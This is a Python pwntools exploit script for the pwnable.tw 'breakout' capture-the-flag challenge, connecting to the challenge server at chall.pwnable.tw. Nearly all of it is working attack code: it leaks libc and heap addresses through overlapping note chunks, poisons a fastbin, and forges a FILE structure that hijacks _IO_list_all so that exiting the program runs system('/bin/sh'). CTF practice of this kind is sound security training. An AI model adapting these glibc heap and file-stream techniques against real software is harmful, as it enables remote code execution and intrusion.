```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./breakout_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

debug = 0

if args.LOCAL:
    r = process([exe.path])
    if debug:    
        gdb.attach(r, gdbscript='''
            c
            ''')
else:
    r = remote("chall.pwnable.tw", 10400)


def note(cell, size, payload):
    r.sendlineafter(b">", b"note")
    r.sendlineafter(b"Cell:", f"{cell}".encode())
    r.sendlineafter(b"Size: ", f"{size}".encode())
    r.sendafter(b"Note: ", payload)


def punish(cell):
    r.sendlineafter(b">", b"punish")
    r.sendlineafter(b"Cell:", f"{cell}".encode())

def main():

    '''
    r.sendlineafter(b">", b"note")
    r.sendlineafter(b"Cell:", b"0")
    r.sendlineafter(b"Size: ", f"{0x500-0x10}".encode())
    r.sendafter(b"Note: ", b"A"*8)
    '''
    payload = b"\x00"*(0x500-0x20)
    payload += p64(0)
    payload += p64(0x101)
    note(0, 0x500-0x10, payload)


    payload = b"\x00"*0xE0
    payload += p64(0)
    payload += p64(0x210)
    note(8, 0x300-0x10, payload)


    note(5, 0x20-8, b"haha")
    note(4, 0x20-8, b"test")
    note(5, 0x30-8, b"hehe")




    '''
    r.sendlineafter(b">", b"note")
    r.sendlineafter(b"Cell:", b"1")
    r.sendlineafter(b"Size: ", f"{0x20-0x10}".encode())
    r.sendafter(b"Note: ", b"A"*8)
    '''
    note(1, 0x20-0x10, b"A"*8)



    r.sendlineafter(b">", b"list")
    
    #r.recvuntil(b"ice pick\n")
    #r.recvuntil(b"Note "+b"A"*8)

    r.recvuntil(b"Note: AAAAAAAA")
    libc.address = u64(r.recv(6)+b"\x00\x00") - 0x3c3b88

    print("[*] libc: ", hex(libc.address))
    _IO_list_all = libc.sym['_IO_list_all']
    print("[*] _IO_list_all: ", hex(_IO_list_all))

    top_main_arena = libc.address+0x3c3b78

    fastbin_0x20 = top_main_arena-0x50

    print("[*] top main arena: ", hex(top_main_arena))





    # Leak heap
    punish(9)

    payload = p64(fastbin_0x20)
    payload += p64(fastbin_0x20)


    note(9, 0x50-0x10, payload)

    r.sendlineafter(b">", b"list")

    r.recvuntil(b"Note: ")
    r.recv(8)
    r.recv(8)
    heap_leak = u64(r.recv(6)+b"\x00\x00")

    print("[*] heap leak: ", hex(heap_leak))


    #r.interactive()




    # chunk 0x100
    target = heap_leak + 0x510
    print("[*] chunk 0x100: ", hex(target))

    # Set-up
    note(9, 0x200-0x10, b"GNAS-0x200")

    #fastbin [size = 0x50] -> chunk
    payload = p64(0) + p64(0)
    payload += p64(0) 
    payload += p32(0) # age
    payload += p32(9) # cell
    payload += p64(0) 
    payload += p64(0x100-0x10)
    payload += p64(target)
    note(7, 0x50-0x10, payload)




    note(8, 0x1000, b"alarm??") # Free chunk (size = 0x300)


    unsorted_bin = libc.address + 0x3c3b78
    print("[*] unsorted_bin: ", hex(unsorted_bin))


    vtable = heap_leak+0x5d8


    my_fsop = b"/bin/sh\x00"+p64(0x61)
    my_fsop += p64(unsorted_bin)
    my_fsop += p64(_IO_list_all-0x10)
    my_fsop += p64(1)+p64(2)
    my_fsop = my_fsop.ljust(0xc0, b"\x00")
    my_fsop += b"\x00"*24
    my_fsop += p64(vtable)
    my_fsop += p64(libc.sym['system'])


    note(9, 0x100-8, my_fsop)


    # type: "exit"
    # --> WIN

    # good luck pwning :)
    r.sendlineafter(b">", b"exit")

    r.interactive()


if __name__ == "__main__":
    main()

```
